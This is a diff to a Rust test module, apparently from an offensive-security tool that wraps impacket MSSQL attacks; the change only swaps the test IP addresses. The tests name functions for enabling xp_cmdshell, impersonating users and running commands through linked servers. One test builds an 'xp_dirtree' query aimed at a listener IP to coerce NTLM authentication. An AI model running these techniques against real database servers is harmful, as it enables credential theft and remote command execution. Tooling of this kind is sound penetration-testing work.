@@ -167,13 +167,13 @@ mod tests {
 
     #[test]
     fn mssql_requires_username() {
-        let args = json!({"target": "10.0.0.1"});
+        let args = json!({"target": "192.168.58.1"});
         assert!(required_str(&args, "username").is_err());
     }
 
     #[test]
     fn mssql_windows_auth_default_false() {
-        let args = json!({"target": "10.0.0.1", "username": "sa"});
+        let args = json!({"target": "192.168.58.1", "username": "sa"});
         let windows_auth = optional_bool(&args, "windows_auth").unwrap_or(false);
         assert!(!windows_auth);
     }
@@ -181,7 +181,7 @@ mod tests {
     #[test]
     fn mssql_windows_auth_explicit_true() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "admin",
             "windows_auth": true
         });
@@ -194,27 +194,27 @@ mod tests {
     #[test]
     fn mssql_auth_string_with_domain_and_password() {
         let auth_str =
-            credentials::impacket_target(Some("CONTOSO"), "sa", Some("P@ss"), "10.0.0.1");
-        assert_eq!(auth_str, "CONTOSO/sa:P@ss@10.0.0.1");
+            credentials::impacket_target(Some("CONTOSO"), "sa", Some("P@ss"), "192.168.58.1");
+        assert_eq!(auth_str, "CONTOSO/sa:P@ss@192.168.58.1");
     }
 
     #[test]
     fn mssql_auth_string_no_domain() {
-        let auth_str = credentials::impacket_target(None, "sa", Some("P@ss"), "10.0.0.1");
-        assert_eq!(auth_str, "sa:P@ss@10.0.0.1");
+        let auth_str = credentials::impacket_target(None, "sa", Some("P@ss"), "192.168.58.1");
+        assert_eq!(auth_str, "sa:P@ss@192.168.58.1");
     }
 
     #[test]
     fn mssql_auth_string_no_password() {
-        let auth_str = credentials::impacket_target(Some("CONTOSO"), "sa", None, "10.0.0.1");
-        assert_eq!(auth_str, "CONTOSO/sa@10.0.0.1");
+        let auth_str = credentials::impacket_target(Some("CONTOSO"), "sa", None, "192.168.58.1");
+        assert_eq!(auth_str, "CONTOSO/sa@192.168.58.1");
     }
 
     // --- mssql_command ---
 
     #[test]
     fn mssql_command_requires_command() {
-        let args = json!({"target": "10.0.0.1", "username": "sa"});
+        let args = json!({"target": "192.168.58.1", "username": "sa"});
         assert!(required_str(&args, "command").is_err());
     }
 
@@ -233,7 +233,7 @@ mod tests {
     #[test]
     fn enable_xp_cmdshell_no_impersonate() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "password": "P@ss"
         });
@@ -261,7 +261,7 @@ mod tests {
     #[test]
     fn impersonate_requires_impersonate_user() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "query": "SELECT 1"
         });
@@ -271,7 +271,7 @@ mod tests {
     #[test]
     fn impersonate_requires_query() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "impersonate_user": "dbo"
         });
@@ -291,7 +291,7 @@ mod tests {
     #[test]
     fn linked_server_requires_linked_server() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "query": "SELECT 1"
         });
@@ -301,7 +301,7 @@ mod tests {
     #[test]
     fn linked_server_requires_query() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "linked_server": "SQL02"
         });
@@ -334,7 +334,7 @@ mod tests {
     #[test]
     fn linked_xpcmdshell_requires_command() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa",
             "linked_server": "SQL02"
         });
@@ -345,15 +345,18 @@ mod tests {
 
     #[test]
     fn ntlm_coerce_xp_dirtree_format() {
-        let listener_ip = "10.0.0.5";
+        let listener_ip = "192.168.58.5";
         let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");
-        assert_eq!(full_query, "EXEC master..xp_dirtree '\\\\10.0.0.5\\share'");
+        assert_eq!(
+            full_query,
+            "EXEC master..xp_dirtree '\\\\192.168.58.5\\share'"
+        );
     }
 
     #[test]
     fn ntlm_coerce_requires_listener_ip() {
         let args = json!({
-            "target": "10.0.0.1",
+            "target": "192.168.58.1",
             "username": "sa"
         });
         assert!(required_str(&args, "listener_ip").is_err());
@@ -367,7 +370,7 @@ mod tests {
     async fn mssql_command_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa",
+            "target": "192.168.58.1", "username": "sa",
             "password": "P@ss", "command": "SELECT @@version"
         });
         assert!(super::mssql_command(&args).await.is_ok());
@@ -377,7 +380,7 @@ mod tests {
     async fn mssql_command_windows_auth_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "admin",
+            "target": "192.168.58.1", "username": "admin",
             "password": "P@ss", "domain": "CONTOSO",
             "windows_auth": true, "command": "SELECT 1"
         });
@@ -388,7 +391,7 @@ mod tests {
     async fn mssql_enable_xp_cmdshell_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss"
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
         });
         assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
     }
@@ -397,7 +400,7 @@ mod tests {
     async fn mssql_enable_xp_cmdshell_impersonate_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
             "impersonate_user": "dbo"
         });
         assert!(super::mssql_enable_xp_cmdshell(&args).await.is_ok());
@@ -407,7 +410,7 @@ mod tests {
     async fn mssql_enum_impersonation_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss"
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
         });
         assert!(super::mssql_enum_impersonation(&args).await.is_ok());
     }
@@ -416,7 +419,7 @@ mod tests {
     async fn mssql_impersonate_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
             "impersonate_user": "dbo", "query": "SELECT SYSTEM_USER"
         });
         assert!(super::mssql_impersonate(&args).await.is_ok());
@@ -426,7 +429,7 @@ mod tests {
     async fn mssql_enum_linked_servers_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss"
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss"
         });
         assert!(super::mssql_enum_linked_servers(&args).await.is_ok());
     }
@@ -435,7 +438,7 @@ mod tests {
     async fn mssql_exec_linked_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
             "linked_server": "SQL02", "query": "SELECT 1"
         });
         assert!(super::mssql_exec_linked(&args).await.is_ok());
@@ -445,7 +448,7 @@ mod tests {
     async fn mssql_linked_enable_xpcmdshell_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
             "linked_server": "SQL02"
         });
         assert!(super::mssql_linked_enable_xpcmdshell(&args).await.is_ok());
@@ -455,7 +458,7 @@ mod tests {
     async fn mssql_linked_xpcmdshell_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
             "linked_server": "SQL02", "command": "whoami"
         });
         assert!(super::mssql_linked_xpcmdshell(&args).await.is_ok());
@@ -465,8 +468,8 @@ mod tests {
     async fn mssql_ntlm_coerce_executes() {
         mock::push(mock::success());
         let args = json!({
-            "target": "10.0.0.1", "username": "sa", "password": "P@ss",
-            "listener_ip": "10.0.0.5"
+            "target": "192.168.58.1", "username": "sa", "password": "P@ss",
+            "listener_ip": "192.168.58.5"
         });
         assert!(super::mssql_ntlm_coerce(&args).await.is_ok());
     }
